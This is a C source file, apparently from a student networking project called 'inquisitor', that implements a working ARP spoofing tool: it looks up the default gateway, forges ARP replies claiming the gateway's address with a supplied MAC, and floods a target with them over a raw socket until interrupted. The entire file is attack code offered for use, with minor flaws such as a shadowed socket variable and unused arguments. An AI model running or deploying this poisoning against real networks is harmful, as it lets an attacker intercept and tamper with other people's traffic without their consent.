#include "inquisitor.h"
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <netinet/in.h>

#define IP4LEN 4
#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int	sock;

static void	usage(void)
{
	fprintf(stderr, "Usage: ./arp-spoof [-h] [-i interface] [-v]\n");
	fprintf(stderr, "Options:\n");
	fprintf(stderr, "  -h\t\tPrint this help message\n");
	fprintf(stderr, "  -i interface\tSpecify the interface to use\n");
	fprintf(stderr, "  -v\t\tVerbose mode\n");
}

static void	sigint_handler(int signum)
{
	(void)signum;
	close(sock);
	printf("\n");
	exit(0);
}

static const char	*get_default_interface(void)
{
	char	errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*interfaces;

	if (pcap_findalldevs(&interfaces, errbuf) < 0)
	{
		fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	if (interfaces == NULL)
	{
		fprintf(stderr, "No interfaces found\n");
		exit(1);
	}
	printf("default interface is %s\n", interfaces->name);
	return (interfaces->name);
}

static void	get_gateway(char *gateway_ip)
{
	FILE			*fp;
	char			buf[256];
	char			iface[16];
	unsigned long	dest;
	unsigned long	gw;
	struct in_addr	gw_addr;

	if ((fp = fopen("/proc/net/route", "r")) == NULL)
	{
		perror("fopen");
		exit(1);
	}
	fgets(buf, sizeof(buf), fp);
	while (fgets(buf, sizeof(buf), fp))
	{
		if (sscanf(buf, "%15s %lx %lx", iface, &dest, &gw) == 3)
		{
			if (dest == 0)
			{
				gw_addr.s_addr = gw;
				printf("gateway is %s\n", inet_ntoa(gw_addr));
				strncpy(gateway_ip, inet_ntoa(gw_addr), 16);
				fclose(fp);
				return ;
			}
		}
	}
	fprintf(stderr, "Could not find gateway\n");
	fclose(fp);
}

static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
{
	int					sock;
	char				buffer[42];
	struct ether_header	*eth;
	struct ether_arp	*arp;
	struct sockaddr_ll	device;
	u_char				source_mac[MAC_ADDR_LEN];
	char				gateway_ip[16] = {0};

	eth = (struct ether_header *)buffer;
	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
	{
		perror("socket");
		exit(1);
	}
	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&source_mac[0], &source_mac[1], &source_mac[2],
		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
	{
		fprintf(stderr, "Invalid MAC address\n");
		exit(1);
	}
	get_gateway(gateway_ip);
	memset(eth->ether_dhost, 0xff, ETH_ALEN);
	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETH_P_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = 4;
	arp->arp_op = htons(ARPOP_REPLY);

	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
	inet_pton(AF_INET, gateway_ip, arp->arp_spa);
	memset(arp->arp_tha, 0, ETH_ALEN);
	inet_pton(AF_INET, ip_target, arp->arp_tpa);

	memset(&device, 0, sizeof(device));
	device.sll_family = AF_PACKET;
	device.sll_ifindex = if_nametoindex(dev);
	if (device.sll_ifindex == 0)
	{
		perror("if_nametoindex");
		exit(1);
	}
	device.sll_halen = ETH_ALEN;
	while(1)
	{
		printf("sending arp reply to %s\n", ip_target);
		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
		{
			perror("sendto");
			exit(1);
		}
		sleep(1);
	}
	(void)verbose;
	(void)mac_target;
	(void)ip_src;
	close(sock);
}


int	main(int argc, char **argv)
{
//	char		errbuf[PCAP_ERRBUF_SIZE];
	const char	*dev;
	char		*ip_src;
	char		*ip_target;
	char		*mac_src;
	char		*mac_target;
	bool		verbose;
	int			opt;

	if (getuid() != 0)
	{
		fprintf(stderr, "You must be root to use this program\n");
		return (1);
	}
	if (argc < 2)
	{
		usage();
		return (1);
	}
	verbose = false;
	dev = NULL;
	while ((opt = getopt(argc, argv, "hi:v")) != -1)
	{
		switch (opt)
		{
			case 'h':
				usage();
				return (0);
			case 'i':
				dev = optarg;
				break ;
			case 'v':
				verbose = true;
				break ;
			default:
				usage();
				return (1);
		}
	}
	if (argc - optind < 4)
	{
		usage();
		return (1);
	}
	ip_src = argv[optind];
	mac_src = argv[optind + 1];
	ip_target = argv[optind + 2];
	mac_target = argv[optind + 3];
	signal(SIGINT, sigint_handler);
	if (dev == NULL)
			dev = get_default_interface();
	printf("dev is %s\n", dev);
	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
	return (0);
}
